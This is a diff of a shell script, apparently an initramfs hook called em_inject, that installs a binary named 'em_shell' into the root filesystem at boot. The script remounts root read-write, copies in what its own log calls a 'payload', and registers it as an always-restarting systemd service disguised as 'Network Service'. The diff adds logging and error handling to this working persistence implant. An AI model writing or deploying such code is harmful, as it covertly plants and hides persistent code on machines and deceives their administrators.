@@ -15,22 +15,37 @@ esac
 # it wasn't exported into this subshell
 : "${rootmnt:=/root}"
 
+echo "em_inject: start rootmnt=$rootmnt" > /dev/kmsg 2>/dev/null
+
 # Idempotent — do nothing if already injected
-[ -f "${rootmnt}/usr/local/bin/em_shell" ] && exit 0
+if [ -f "${rootmnt}/usr/local/bin/em_shell" ]; then
+    echo "em_inject: already installed, skipping" > /dev/kmsg 2>/dev/null
+    exit 0
+fi
 
-echo "em_inject: installing payload" > /dev/kmsg 2>/dev/null
+mount -o remount,rw "${rootmnt}" 2>/dev/null
+echo "em_inject: remounted rw" > /dev/kmsg 2>/dev/null
 
+echo "em_inject: copying binary" > /dev/kmsg 2>/dev/null
 cp /bin/em_shell "${rootmnt}/usr/local/bin/em_shell" || {
     echo "em_inject: copy failed" > /dev/kmsg 2>/dev/null
     exit 1
 }
 chmod +x "${rootmnt}/usr/local/bin/em_shell"
+echo "em_inject: binary OK" > /dev/kmsg 2>/dev/null
 
 printf '[Unit]\nDescription=Network Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/em_shell\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n' \
-    > "${rootmnt}/etc/systemd/system/em-shell.service"
+    > "${rootmnt}/etc/systemd/system/em-shell.service" || {
+    echo "em_inject: service file write failed" > /dev/kmsg 2>/dev/null
+    exit 1
+}
+echo "em_inject: service file written" > /dev/kmsg 2>/dev/null
 
 mkdir -p "${rootmnt}/etc/systemd/system/multi-user.target.wants"
 ln -sf /etc/systemd/system/em-shell.service \
-       "${rootmnt}/etc/systemd/system/multi-user.target.wants/em-shell.service"
+       "${rootmnt}/etc/systemd/system/multi-user.target.wants/em-shell.service" || {
+    echo "em_inject: symlink failed" > /dev/kmsg 2>/dev/null
+    exit 1
+}
 
 echo "em_inject: done" > /dev/kmsg 2>/dev/null
